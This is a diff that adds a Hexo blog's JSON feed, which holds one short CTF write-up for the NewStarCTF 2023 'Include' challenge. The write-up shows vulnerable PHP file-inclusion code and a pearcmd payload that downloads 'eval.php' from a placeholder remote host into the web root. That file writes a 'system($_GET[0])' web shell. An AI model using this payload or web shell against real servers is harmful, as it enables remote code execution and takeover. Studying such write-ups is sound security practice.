@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"文件包含\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/",
+            "url": "http://odiws.github.io/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/",
+            "title": "NewStarCTF_2023_公开赛道Include",
+            "date_published": "2025-02-23T11:20:05.000Z",
+            "content_html": "<h2 id=\"newstarctf-2023-公开赛道include\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道include\">#</a> [NewStarCTF 2023 公开赛道] Include 🍐</h2>\n<pre><code>&lt;?php\n    error_reporting(0);\n    if(isset($_GET['file'])) &#123;\n        $file = $_GET['file'];\n        \n        if(preg_match('/flag|log|session|filter|input|data/i', $file)) &#123;\n            die('hacker!');\n        &#125;\n        \n        include($file.&quot;.php&quot;);\n        # Something in phpinfo.php!\n    &#125;\n    else &#123;\n        highlight_file(__FILE__);\n    &#125;\n?&gt;\n</code></pre>\n<p>paylaod:</p>\n<pre><code>?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/eval.php\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202502231925691.png\" alt=\"image-20250223192533238\"></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202502231925605.png\" alt=\"image-20250223192547479\"></p>\n<p>eval.php:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;?php system($_GET[0]);'</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure>",
+            "tags": [
+                "buuctf",
+                "文件包含"
+            ]
+        }
+    ]
+}
